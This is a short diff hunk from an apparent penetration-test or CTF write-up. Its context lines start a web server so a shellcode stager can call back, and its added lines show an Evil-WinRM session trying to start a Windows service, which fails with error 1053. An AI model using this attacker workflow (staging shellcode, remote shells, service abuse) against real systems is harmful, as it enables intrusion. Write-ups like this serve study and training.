@@ -1203,5 +1203,10 @@ python3 -m http.server 80
 Ill start a webserver so the stager can reach back in pull the shellcode
 
 ```python
+*Evil-WinRM* PS C:\Program Files\PrintNotify> sc.exe start PrintNotifyService
+[SC] StartService FAILED 1053:
 
+The service did not respond to the start or control request in a timely fashion.
 ```
+
+
